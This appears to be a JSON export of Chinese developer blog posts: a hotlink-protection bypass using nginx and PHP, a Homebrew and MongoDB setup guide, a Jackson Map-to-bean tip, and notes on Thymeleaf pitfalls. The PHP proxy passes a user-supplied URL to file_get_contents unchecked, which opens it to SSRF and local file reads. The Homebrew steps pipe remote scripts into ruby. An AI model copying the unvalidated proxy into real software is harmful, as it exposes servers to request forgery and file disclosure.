class=\"hljs-keyword\">echo</span> file_get_contents(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">\"url\"</span>])?<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">\"url\"</span>]:<span class=\"hljs-string\">''</span>);\n<span class=\"hljs-preprocessor\">?&gt;</span></span>  </code></pre>",
			"markdowncontent":"---\ntitle: 破解防盗链的图片的一些方法总结\ntags: nginx,php,防盗链\n---\n\n> 为什么要反向代理处理图片资源呢？因为在做网站采集的时候，有时候我们并不想吧网站的图片全部下载下来，而是希望可以引用它原本网站上的图片，这样可以我们既可以拿到资源，又可以节约我们的磁盘空间，不过坏处就是被抓取的网站如果挂了，图片无法访问，那同样我们的服务器去访问也就失败了！\n\n### 1.nginx 反向代理配置server里面的一个路径pic\n\n```\nlocation /pic/ {\n\t\t\tset $hostx \"\"; \n\t\t\tset $addrs \"\"; \n\t\t\tif ( $uri ~ \"^/pic/http./+([^/]+)/(.+)$\") { \n\t\t\t set $hostx $1; \n\t\t\t set $addrs $2; \n\t\t\t} \n\t\t\t#resolver 127.0.0.1; \n\t\t\t#proxy_pass http://$hostx/$addrs; \n\t\t\t#proxy_set_header referer \"http://$hostx\";\n\t\t\trewrite ^(.*)$  http://$hostx/$addrs;\n\t\t\t#http://mmbiz.qpic.cn/$arg_url;\n\t\t\t#proxy_pass http://mmbiz.qpic.cn/$arg_search;\n\t\t}\n```\n\n本来是想用proxy来做的，试了下会发生一个死循环，还不知道为什么无法成功，网上资料也还没找到，要是有同学会的话，希望可以指教一二， 最后我只好用rewrite 来让它去跳转了.\n对uri进行了一个处理，pic目录后面的应该跟上完整的图片的http路径，然后rewrite到hosts去。。\n\n####  ***待解决*** ：\n> 还是要用proxy_pass来处理，这样可以加referer，更完美\n\n*************\n\n****10月31日更新****\n> 解决了proxy_pass处理失败的问题，原因是resolver没有指定dns地址，用本地地址报错，所以换成电脑上的dns地址就OK了。不过在处理微信公众号还是下载不下来，我还没弄清楚具体原因。\n\n### php下载文件解决：\n\n使用php来做一个下载生成，只需要两行代码即可完成：\n\n```\n<?php\n  header('Content-type: image/jpeg');\n  echo file_get_contents(isset($_GET[\"url\"])?$_GET[\"url\"]:'');\n?>  \n```\n\n",
			"tags":"nginx,服务器",
			"id":"52965691",
			"categories":"nginx",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年10月04日 11:33:50",
			"articleedittype":1,
			"private":0,
			"channel":"12",
			"description":"Homebrew是Mac下得套件管理器，类似于Linux系统中的 yum 或者 apt-get ，它能让你的Mac更完美。mongodb则是NOSQL数据库，一种文档数据库，不同于传统的关系型数据库(mysql,orcal等)，这篇文章对brew做了基本介绍并使用brew在Mac下安装mongoddb以及其中的问题和注意事项（笔者笔记）\n最近工作需要完成的任务比较多，所以前一篇系列博客（基于gulp",
			"title":"mac mongodb安装及使用记录",
			"type":"repost",
			"content":"<blockquote>\n  <p>Homebrew是Mac下得套件管理器，类似于Linux系统中的 yum 或者 apt-get ，它能让你的Mac更完美。mongodb则是NOSQL数据库，一种文档数据库，不同于传统的关系型数据库(mysql,orcal等)，这篇文章对brew做了基本介绍并使用brew在Mac下安装mongoddb以及其中的问题和注意事项（笔者笔记）</p>\n</blockquote>\n\n<p>最近工作需要完成的任务比较多，所以前一篇系列博客（基于gulp requirejs rjs的前端自动化构建系列文章）还没完成，先在此插一篇博客，记录一些东西，由于最近在工作中需要针对我们的现有前端框架搭建一套配合输出的后台系统，用来完成前端构建，输出项目等工作，于是准备使用node + express做项目估价，mongodb做持久化，而本篇文章，记录了Mac下使用brew安装mongodb的有关东西。</p>\n\n\n\n<h1 id=\"homebrew\">Homebrew</h1>\n\n<p><a href=\"http://brew.sh/index_zh-cn.html\">Homebrew</a> 是Mac下得软件包管理工具，我们可以用它在我们的Mac下安装软件，卸载软件等。要是用Homebrew，首先我们要在我们的Mac下安装Homebrew，执行下面的命令进行安装：</p>\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\">ruby <span class=\"hljs-operator\">-e</span><span class=\"hljs-string\">\"<span class=\"hljs-variable\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>\"</span></code></pre>\n\n<p>Homebrew的安装很简单，使用一条ruby命令，我们的Mac电脑自带ruby，你可以在终端中试一下：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">ruby <span class=\"hljs-attribute\">-v</span></code></pre>\n\n<p>如下，输出ruby的版本：</p>\n\n<p><a href=\"http://7xlolm.com1.z0.glb.clouddn.com/201511211.pic.jpg\"><img src=\"http://7xlolm.com1.z0.glb.clouddn.com/201511211.pic.jpg\" alt=\"Mac终端下查看ruby版本\" title=\"\"></a></p>\n\n<p>执行安装命令，安装brew，安装完成后，我们就可以使用brew安装Mac下得软件了，在安装mongodb之前，我们再了解了解brew，首先如何卸载brew?如果你不知道怎么去卸载的话，你可以再次执行一次brew的安装命令，如果你已经安装了brew再次执行安装命令的话，会给你一个提示，告诉你你的系统已经安装过brew了，如果想要重复安装就执行卸载命令，这样，你根据终端的提示执行以下卸载命令就可以了，另外我也把brew的卸载命令贴出来：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\">ruby <span class=\"hljs-operator\">-e</span><span class=\"hljs-string\">\"<span class=\"hljs-variable\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)</span>\"</span></code></pre>\n\n<p>其实就是把安装命令中的install改成uninstall就ok了。</p>\n\n<p>下面列出一些brew的常用命令：</p>\n\n<p>1、跟新brew本身</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs sql\">    brew <span class=\"hljs-operator\"><span class=\"hljs-keyword\">update</span></span></code></pre>\n\n<p>2、使用brew安装软件</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs cmake\">    brew <span class=\"hljs-keyword\">install</span> soft_name\n    // soft_name为你所要安装软件的标志，如使用brew安装git\n    brew <span class=\"hljs-keyword\">install</span> git</code></pre>\n\n<p>3、使用brew卸载软件</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs cs\">    brew uninstall soft_name\n    <span class=\"hljs-comment\">// soft_name为你所要卸载软件的标志，如使用brew卸载git</span>\n    brew uninstall git</code></pre>\n\n<p>4、显示使用brew安装的软件列表</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs php\">    brew <span class=\"hljs-keyword\">list</span></code></pre>\n\n<p>5、更新软件</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs cs\">    brew upgrade        <span class=\"hljs-comment\">// 更新所有使用brew安装的软件</span>\n    brew upgrade git    <span class=\"hljs-comment\">// 更新某个使用brew安装的软件</span></code></pre>\n\n<p>6、查看哪些软件需要更新</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs \">    brew outdated</code></pre>\n\n<p>7、查找软件</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs cs\">    <span class=\"hljs-comment\">// 当你记不清软件的名字的时候，你可以使用search，只需要写去几个字母，他就会帮你联想，并把所有可能的结果输出给你</span>\n    brew search</code></pre>\n\n<p>下图为使用brew search gi的输出结果：</p>\n\n<p><a href=\"http://7xlolm.com1.z0.glb.clouddn.com/201511212.pic_hd.jpg\"><img src=\"http://7xlolm.com1.z0.glb.clouddn.com/201511212.pic_hd.jpg\" alt=\"使用brew search gi\" title=\"\"></a></p>\n\n<p>8、查看使用brew安装的东西，安装在哪里</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs brainfuck\">    <span class=\"hljs-comment\">brew</span> <span class=\"hljs-literal\">-</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">cache</span></code></pre>\n\n<p><a href=\"https://github.com/Homebrew/homebrew/blob/master/share/doc/homebrew/FAQ.md\">更多命令</a></p>\n\n<h1 id=\"使用brew安装mongodb\">使用brew安装mongodb</h1>\n\n<p>1、有了brew，我们安装mongodb就变得很简单了：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs cmake\">    brew <span class=\"hljs-keyword\">install</span> mongodb</code></pre>\n\n<p><a href=\"http://7xlolm.com1.z0.glb.clouddn.com/201511213.pic.jpg\"><img src=\"http://7xlolm.com1.z0.glb.clouddn.com/201511213.pic.jpg\" alt=\"安装完成\" title=\"\"></a></p>\n\n<p>2、之后将我们的mongodb升级一下，确保版本最新的</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs \">    brew upgrade mongodb</code></pre>\n\n<p>如果你现在就启动mongo你并不会成功，如下：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs fsharp\">    Failedto connect to127<span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">27017</span>, reason: errno:<span class=\"hljs-number\">61</span>Connection refused\n\n    Error: couldn't connect <span class=\"hljs-keyword\">to</span> server <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">27017</span> (<span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>), connection attempt failed at src/mongo/shell/mongo.js:<span class=\"hljs-number\">146</span>\n\n    <span class=\"hljs-keyword\">exception</span>: connect failed</code></pre>\n\n<p>3、在启动mongo之前，我们需要创建一个目录，为mongo默认的数据写入目录</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs haskell\">    mkdir -p /<span class=\"hljs-typedef\"><span class=\"hljs-keyword\">data</span>/db</span></code></pre>\n\n<p>4、然后给刚刚创建的目录以可读可写的权限</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs haskell\">    chown `id -u` /<span class=\"hljs-typedef\"><span class=\"hljs-keyword\">data</span>/db</span></code></pre>\n\n<p>5、修改目录</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs haskell\">    // /<span class=\"hljs-typedef\"><span class=\"hljs-keyword\">data</span>/db 目录是mongo的默认目录，如果你想使用其他目录，可以使 <span class=\"hljs-comment\">--dbpath 参数</span></span>\n    mongo<span class=\"hljs-comment\">--dbpath dir_name</span>\n    // dir_name 为你的目录名字</code></pre>\n\n<p>现在，你可以放心的启动mongodb了，执行下面的命令：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs \">    mongod</code></pre>\n\n<p>假如依然包上面那个错误的话，或许你可以试试下面的命令：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs sql\">    brew services <span class=\"hljs-operator\"><span class=\"hljs-keyword\">start</span> mongodb</span></code></pre>\n\n<p>不过，brew services 已经将要废除了，并且已经没有人维护了，具体查看<a href=\"https://github.com/Homebrew/homebrew/issues/30628\">点击这里</a></p>\n\n<p>现在如果一切顺利的话应该像下面这样：</p>\n\n<p><a href=\"http://7xlolm.com1.z0.glb.clouddn.com/201511214.pic.jpg\"><img src=\"http://7xlolm.com1.z0.glb.clouddn.com/201511214.pic.jpg\" alt=\"启动mongodb成功\" title=\"\"></a></p>\n\n<p>如果有一天你发现你的数据库突然启动不了了，可能是你为正常关闭导致的，你可以删除掉mongod.lock文件，然后重新启动，如果还是不可以，你可以查看一下进程，然后杀掉：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs 1c\">    ps -aef <span class=\"hljs-string\">| grep mongo</span></code></pre>\n\n<p>如下：</p>\n\n<p><a href=\"http://7xlolm.com1.z0.glb.clouddn.com/201512031.pic.jpg\"><img src=\"http://7xlolm.com1.z0.glb.clouddn.com/201512031.pic.jpg\" alt=\"进程\" title=\"\"></a></p>\n\n<p>然后根据进程ID杀掉进程：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\">    <span class=\"hljs-built_in\">sudo</span> kill6955</code></pre>\n\n<p>重新启动mongodb服务，即可：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs \">    mongod</code></pre>\n\n<p>我们可以新开一个终端窗口连接数据库并试着查看所有的数据库：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs sql\">    mongo\n\n    <span class=\"hljs-operator\"><span class=\"hljs-keyword\">show</span> dbs</span></code></pre>\n\n<p><a href=\"http://7xlolm.com1.z0.glb.clouddn.com/201511215.pic.jpg\"><img src=\"http://7xlolm.com1.z0.glb.clouddn.com/201511215.pic.jpg\" alt=\"查看数据库\" title=\"\"></a></p>\n\n<p>最后，像大家推荐一个连接mongo的客户端可视化工具 <a href=\"http://www.robomongo.org/\">robomongodb</a>，它是跨平台的工具，我们可以下载Mac版的，安装后打开，界面是这个样子：</p>\n\n<p><a href=\"http://7xlolm.com1.z0.glb.clouddn.com/201511216.pic.jpg\"><img src=\"http://7xlolm.com1.z0.glb.clouddn.com/201511216.pic.jpg\" alt=\"robomongodb界面\" title=\"\"></a></p>\n\n<p>点击create按钮，创建新的连接，会弹出一个连接的配置框，里面有一些默认的参数，我们保持默认，直接点击save，再点击connect按钮就好了：</p>\n\n<p><a href=\"http://7xlolm.com1.z0.glb.clouddn.com/201511217.pic.jpg\"><img src=\"http://7xlolm.com1.z0.glb.clouddn.com/201511217.pic.jpg\" alt=\"点击create创建连接\" title=\"\"></a></p>\n\n<p>下图是点击connect连接数据库成功后的界面</p>\n\n<p><a href=\"http://7xlolm.com1.z0.glb.clouddn.com/201511218.pic.jpg\"><img src=\"http://7xlolm.com1.z0.glb.clouddn.com/201511218.pic.jpg\" alt=\"点击connect连接数据库\" title=\"\"></a></p>\n\n<p>好了，其他的作者还要继续捣鼓捣鼓，大家共勉，努力学习吧骚年。</p>",
			"markdowncontent":"> Homebrew是Mac下得套件管理器，类似于Linux系统中的 yum 或者 apt-get ，它能让你的Mac更完美。mongodb则是NOSQL数据库，一种文档数据库，不同于传统的关系型数据库(mysql,orcal等)，这篇文章对brew做了基本介绍并使用brew在Mac下安装mongoddb以及其中的问题和注意事项（笔者笔记）\n\n最近工作需要完成的任务比较多，所以前一篇系列博客（基于gulp requirejs rjs的前端自动化构建系列文章）还没完成，先在此插一篇博客，记录一些东西，由于最近在工作中需要针对我们的现有前端框架搭建一套配合输出的后台系统，用来完成前端构建，输出项目等工作，于是准备使用node + express做项目估价，mongodb做持久化，而本篇文章，记录了Mac下使用brew安装mongodb的有关东西。\n\n# Homebrew\n\n[Homebrew](http://brew.sh/index_zh-cn.html) 是Mac下得软件包管理工具，我们可以用它在我们的Mac下安装软件，卸载软件等。要是用Homebrew，首先我们要在我们的Mac下安装Homebrew，执行下面的命令进行安装：\n\n```\nruby -e\"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n```\n\nHomebrew的安装很简单，使用一条ruby命令，我们的Mac电脑自带ruby，你可以在终端中试一下：\n```\nruby -v\n```    \n\n如下，输出ruby的版本：\n\n[![Mac终端下查看ruby版本](http://7xlolm.com1.z0.glb.clouddn.com/201511211.pic.jpg)](http://7xlolm.com1.z0.glb.clouddn.com/201511211.pic.jpg)\n\n执行安装命令，安装brew，安装完成后，我们就可以使用brew安装Mac下得软件了，在安装mongodb之前，我们再了解了解brew，首先如何卸载brew?如果你不知道怎么去卸载的话，你可以再次执行一次brew的安装命令，如果你已经安装了brew再次执行安装命令的话，会给你一个提示，告诉你你的系统已经安装过brew了，如果想要重复安装就执行卸载命令，这样，你根据终端的提示执行以下卸载命令就可以了，另外我也把brew的卸载命令贴出来：\n\n```\nruby -e\"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)\"\n```    \n\n其实就是把安装命令中的install改成uninstall就ok了。\n\n下面列出一些brew的常用命令：\n\n1、跟新brew本身\n```\n    brew update\n```    \n\n2、使用brew安装软件\n```\n    brew install soft_name\n    // soft_name为你所要安装软件的标志，如使用brew安装git\n    brew install git\n```    \n\n3、使用brew卸载软件\n```\n    brew uninstall soft_name\n    // soft_name为你所要卸载软件的标志，如使用brew卸载git\n    brew uninstall git\n```    \n\n4、显示使用brew安装的软件列表\n\n```\n    brew list\n```\n\n5、更新软件\n```\n    brew upgrade\t\t// 更新所有使用brew安装的软件\n    brew upgrade git\t// 更新某个使用brew安装的软件\n```\n\n6、查看哪些软件需要更新\n\n```\n    brew outdated\n```\n\n7、查找软件\n\n```\n    // 当你记不清软件的名字的时候，你可以使用search，只需要写去几个字母，他就会帮你联想，并把所有可能的结果输出给你\n    brew search\n```\n\n下图为使用brew search gi的输出结果：\n\n[![使用brew search gi](http://7xlolm.com1.z0.glb.clouddn.com/201511212.pic_hd.jpg)](http://7xlolm.com1.z0.glb.clouddn.com/201511212.pic_hd.jpg)\n\n8、查看使用brew安装的东西，安装在哪里\n\n```\n    brew --cache\n```\n\n[更多命令](https://github.com/Homebrew/homebrew/blob/master/share/doc/homebrew/FAQ.md)\n\n# 使用brew安装mongodb\n\n1、有了brew，我们安装mongodb就变得很简单了：\n\n```\n    brew install mongodb\n```\n\n[![安装完成](http://7xlolm.com1.z0.glb.clouddn.com/201511213.pic.jpg)](http://7xlolm.com1.z0.glb.clouddn.com/201511213.pic.jpg)\n\n2、之后将我们的mongodb升级一下，确保版本最新的\n\n```\n    brew upgrade mongodb\n```\n\n如果你现在就启动mongo你并不会成功，如下：\n\n```\n    Failedto connect to127.0.0.1:27017, reason: errno:61Connection refused\n    \n    Error: couldn't connect to server 127.0.0.1:27017 (127.0.0.1), connection attempt failed at src/mongo/shell/mongo.js:146\n    \n    exception: connect failed\n```    \n\n3、在启动mongo之前，我们需要创建一个目录，为mongo默认的数据写入目录\n\n```\n    mkdir -p /data/db\n```\n\n4、然后给刚刚创建的目录以可读可写的权限\n\n```\n    chown `id -u` /data/db\n```\n\n5、修改目录\n\n```\n    // /data/db 目录是mongo的默认目录，如果你想使用其他目录，可以使 --dbpath 参数\n    mongo--dbpath dir_name\n    // dir_name 为你的目录名字\n```\n\n现在，你可以放心的启动mongodb了，执行下面的命令：\n\n```\n    mongod\n```\n\n假如依然包上面那个错误的话，或许你可以试试下面的命令：\n```\n    brew services start mongodb\n```\n\n不过，brew services 已经将要废除了，并且已经没有人维护了，具体查看[点击这里](https://github.com/Homebrew/homebrew/issues/30628)\n\n现在如果一切顺利的话应该像下面这样：\n\n[![启动mongodb成功](http://7xlolm.com1.z0.glb.clouddn.com/201511214.pic.jpg)](http://7xlolm.com1.z0.glb.clouddn.com/201511214.pic.jpg)\n\n如果有一天你发现你的数据库突然启动不了了，可能是你为正常关闭导致的，你可以删除掉mongod.lock文件，然后重新启动，如果还是不可以，你可以查看一下进程，然后杀掉：\n\n```\n    ps -aef | grep mongo\n```\n\n如下：\n\n[![进程](http://7xlolm.com1.z0.glb.clouddn.com/201512031.pic.jpg)](http://7xlolm.com1.z0.glb.clouddn.com/201512031.pic.jpg)\n\n然后根据进程ID杀掉进程：\n\n```\n    sudo kill6955\n```\n\n重新启动mongodb服务，即可：\n\n```\n    mongod\n```\n\n我们可以新开一个终端窗口连接数据库并试着查看所有的数据库：\n\n```\n    mongo\n    \n    show dbs\n```  \n\n[![查看数据库](http://7xlolm.com1.z0.glb.clouddn.com/201511215.pic.jpg)](http://7xlolm.com1.z0.glb.clouddn.com/201511215.pic.jpg)\n\n最后，像大家推荐一个连接mongo的客户端可视化工具 [robomongodb](http://www.robomongo.org/)，它是跨平台的工具，我们可以下载Mac版的，安装后打开，界面是这个样子：\n\n[![robomongodb界面](http://7xlolm.com1.z0.glb.clouddn.com/201511216.pic.jpg)](http://7xlolm.com1.z0.glb.clouddn.com/201511216.pic.jpg)\n\n点击create按钮，创建新的连接，会弹出一个连接的配置框，里面有一些默认的参数，我们保持默认，直接点击save，再点击connect按钮就好了：\n\n[![点击create创建连接](http://7xlolm.com1.z0.glb.clouddn.com/201511217.pic.jpg)](http://7xlolm.com1.z0.glb.clouddn.com/201511217.pic.jpg)\n\n下图是点击connect连接数据库成功后的界面\n\n[![点击connect连接数据库](http://7xlolm.com1.z0.glb.clouddn.com/201511218.pic.jpg)](http://7xlolm.com1.z0.glb.clouddn.com/201511218.pic.jpg)\n\n好了，其他的作者还要继续捣鼓捣鼓，大家共勉，努力学习吧骚年。",
			"tags":"mongodb,brew,数据库",
			"id":"52733139",
			"categories":"mac,工具使用",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年09月26日 15:29:31",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"用jackson来干\n    Object originOrderDtoMap=orderService.findById(orderDto.getId());\n    ObjectMapper mapper = new ObjectMapper();\n    String json = mapper.writeValueAsString(originOrderDtoMap);\n    OrderD",
			"title":"Map转换为JAVABean的方法",
			"type":"original",
			"content":"<ul>\n<li>用jackson来干</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \">    Object originOrderDtoMap=orderService.findById(orderDto.getId());\n    ObjectMapper mapper = <span class=\"hljs-keyword\">new</span> ObjectMapper();\n    String json = mapper.writeValueAsString(originOrderDtoMap);\n    OrderDto originOrderDto = mapper.readValue(json, OrderDto.class);</code></pre>\n\n<p>其他方法参考：<a href=\"http://blog.csdn.net/cuidiwhere/article/details/8130434\">http://blog.csdn.net/cuidiwhere/article/details/8130434</a></p>",
			"markdowncontent":"* 用jackson来干\n```java\n\tObject originOrderDtoMap=orderService.findById(orderDto.getId());\n    ObjectMapper mapper = new ObjectMapper();\n    String json = mapper.writeValueAsString(originOrderDtoMap);\n    OrderDto originOrderDto = mapper.readValue(json, OrderDto.class);\n```\n其他方法参考：http://blog.csdn.net/cuidiwhere/article/details/8130434",
			"tags":"java,javabean",
			"id":"52670685",
			"categories":"JAVA基础",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年09月23日 14:31:12",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"最近公司用的thymeleaf来做前段渲染框架，老实说我比较喜欢它对html代码的0入侵，但是正因为这一点我又觉得好坑，无法像freemarker那样随便输出动态数据，所有的东西都得和标签有些关联才行。\n1. thymeleaf渲染元素属性值的坑公司有个业务上我需要对a标签的href属性加一个动态id参数上去，<a href=\"asda?id={user.id}\">click</a>这里我准备吧{u",
			"title":"我踩的thymeleaf渲染框架的坑",
			"type":"original",
			"content":"<blockquote>\n  <p>最近公司用的thymeleaf来做前段渲染框架，老实说我比较喜欢它对html代码的0入侵，但是正因为这一点我又觉得好坑，无法像freemarker那样随便输出动态数据，所有的东西都得和标签有些关联才行。</p>\n</blockquote>\n\n\n\n<h2 id=\"1-thymeleaf渲染元素属性值的坑\">1. thymeleaf渲染元素属性值的坑</h2>\n\n<p>公司有个业务上我需要对a标签的href属性加一个动态id参数上去，</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-html hljs \"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">a</span> <span class=\"hljs-attribute\">href</span>=<span class=\"hljs-value\">\"asda?id={user.id}\"</span>&gt;</span>click<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">a</span>&gt;</span></code></pre>\n\n<p>这里我准备吧{user.id}替换为动态的值，但是，thymeleaf坑来了，它是不允许你这样干的，这样干最后得出的结果就是值渲染不上去，然后我又试了好几种办法，比如加上[[${user.id}]]上去，失败·····</p>\n\n<p>最后，天无绝人之路，有了解决办法 <br>\n使用th:attr标签来做</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-html hljs \">th:attr=\"href=asda?id=${user.id}\"</code></pre>\n\n<p>然而，渲染的时候竟然给我报错了。。。。让我感觉应该是字符串拼接的问题。最后加了个单引号，终于解决问题。。。哭晕在地…..</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\">th:attr=<span class=\"hljs-string\">\"href='asda?id='+<span class=\"hljs-variable\">${user.id}</span>\"</span></code></pre>\n\n<p>最后完整的格式：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-html hljs \"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">a</span> <span class=\"hljs-attribute\">th:attr</span>=<span class=\"hljs-value\">\"href='asda?id='+${user.id}\"</span>&gt;</span>click<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">a</span>&gt;</span></code></pre>\n\n<p><strong><em>2017年3月23日更新</em></strong> <br>\n其实还可以这样去做,如下</p>\n\n<pre class=\"prettyprint\"><code class=\"language-html hljs \"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">a</span> <span class=\"hljs-attribute\">th:href</span>=<span class=\"hljs-value\">\"'asda?id='+${user.id}\"</span>&gt;</span>click<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">a</span>&gt;</span></code></pre>\n\n<h2 id=\"2-thymeleaf3做layout布局的坑\">2. thymeleaf3做layout布局的坑</h2>\n\n<p>要做layout布局，首先得给TemplateEngine添加一个layout Dialect才行，然而我一开始并不知道，配置方法：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java = hljs \"> <span class=\"hljs-keyword\">public</span> TemplateEngine <span class=\"hljs-title\">templateEngine</span>() {\n    SpringTemplateEngine engine = <span class=\"hljs-keyword\">new</span> SpringTemplateEngine();\n    engine.setTemplateResolver(templateResolver());\n    engine.setEnableSpringELCompiler(<span class=\"hljs-keyword\">true</span>);\n    engine.addDialect(<span class=\"hljs-keyword\">new</span> LayoutDialect());\n    <span class=\"hljs-keyword\">return</span> engine;\n  }</code></pre>\n\n<p>如果不设置EnableSpringElCompiler为true，项目run的时候会失败并报错。。找了半天。配置好后，其他的问题都已经不是问题，需要注意的是，使用layout布局需要对子页面进行的html标签添加一个layout属性，例如：</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-html hljs \"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">html</span> <span class=\"hljs-attribute\">lang</span>=<span class=\"hljs-value\">\"en\"</span> <span class=\"hljs-attribute\">layout:decorator</span>=<span class=\"hljs-value\">\"mobile/layout\"</span>&gt;</span></code></pre>\n\n\n\n<h2 id=\"3spring-boot-配置thymeleaf3\">3.Spring Boot 配置thymeleaf3.</h2>\n\n<p>由于默认的spring-boot-starter-thymeleaf 使用Thymeleaf2.1，我们要使用thymeleaf3去替换thymeleaf和thymeleaf-layout-dialect版本号，例如</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-xml hljs \"><span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">properties</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">thymeleaf.version</span>&gt;</span>3.0.2.RELEASE<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">thymeleaf.version</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-title\">thymeleaf-layout-dialect.version</span>&gt;</span>2.0.4<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">thymeleaf-layout-dialect.version</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-title\">properties</span>&gt;</span></code></pre>\n\n<blockquote>\n  <p>详细的配置请查看Spring Boot 官方的thymeleaf3的<a href=\"https://github.com/spring-projects/spring-boot/tree/v1.4.2.RELEASE/spring-boot-samples/spring-boot-sample-web-thymeleaf3\">demo演示</a>。 <br>\n  如果你使用了其他的自动配置Thymeleaf，应该去复写他们的版本号。</p>\n</blockquote>",
			"markdowncontent":"> 最近公司用的thymeleaf来做前段渲染框架，老实说我比较喜欢它对html代码的0入侵，但是正因为这一点我又觉得好坑，无法像freemarker那样随便输出动态数据，所有的东西都得和标签有些关联才行。\n\n## 1. thymeleaf渲染元素属性值的坑\n公司有个业务上我需要对a标签的href属性加一个动态id参数上去，\n``` html\n<a href=\"asda?id={user.id}\">click</a>\n```\n这里我准备吧{user.id}替换为动态的值，但是，thymeleaf坑来了，它是不允许你这样干的，这样干最后得出的结果就是值渲染不上去，然后我又试了好几种办法，比如加上[[${user.id}]]上去，失败·····\n\n最后，天无绝人之路，有了解决办法\n使用th:attr标签来做\n\n```html\nth:attr=\"href=asda?id=${user.id}\"\n```\n然而，渲染的时候竟然给我报错了。。。。让我感觉应该是字符串拼接的问题。最后加了个单引号，终于解决问题。。。哭晕在地.....\n\n```\nth:attr=\"href='asda?id='+${user.id}\"\n```\n最后完整的格式：\n```html\n<a th:attr=\"href='asda?id='+${user.id}\">click</a>\n```\n***2017年3月23日更新***\n其实还可以这样去做,如下\n```html\n<a th:href=\"'asda?id='+${user.id}\">click</a>\n```\n\n## 2. thymeleaf3做layout布局的坑\n要做layout布局，首先得给TemplateEngine添加一个layout Dialect才行，然而我一开始并不知道，配置方法：\n\n\n```java =\n public TemplateEngine templateEngine() {\n    SpringTemplateEngine engine = new SpringTemplateEngine();\n    engine.setTemplateResolver(templateResolver());\n    engine.setEnableSpringELCompiler(true);\n    engine.addDialect(new LayoutDialect());\n    return engine;\n  }\n```\n如果不设置EnableSpringElCompiler为true，项目run的时候会失败并报错。。找了半天。配置好后，其他的问题都已经不是问题，需要注意的是，使用layout布局需要对子页面进行的html标签添加一个layout属性，例如：\n```html\n<html lang=\"en\" layout:decorator=\"mobile/layout\">\n```\n\n\n## 3.Spring Boot 配置thymeleaf3.\n\n由于默认的spring-boot-starter-thymeleaf 使用Thymeleaf2.1，我们要使用thymeleaf3去替换thymeleaf和thymeleaf-layout-dialect版本号，例如\n```xml\n<properties>\n    <thymeleaf.version>3.0.2.RELEASE</thymeleaf.version>\n    <thymeleaf-layout-dialect.version>2.0.4</thymeleaf-layout-dialect.version>\n</properties>\n```\n>详细的配置请查看Spring Boot 官方的thymeleaf3的[demo演示](https://github.com/spring-projects/spring-boot/tree/v1.4.2.RELEASE/spring-boot-samples/spring-boot-sample-web-thymeleaf3)。\n如果你使用了其他的自动配置Thymeleaf，应该去复写他们的版本号。",
			"tags":"freemarker,thymeleaf",
			"id":"52637909",
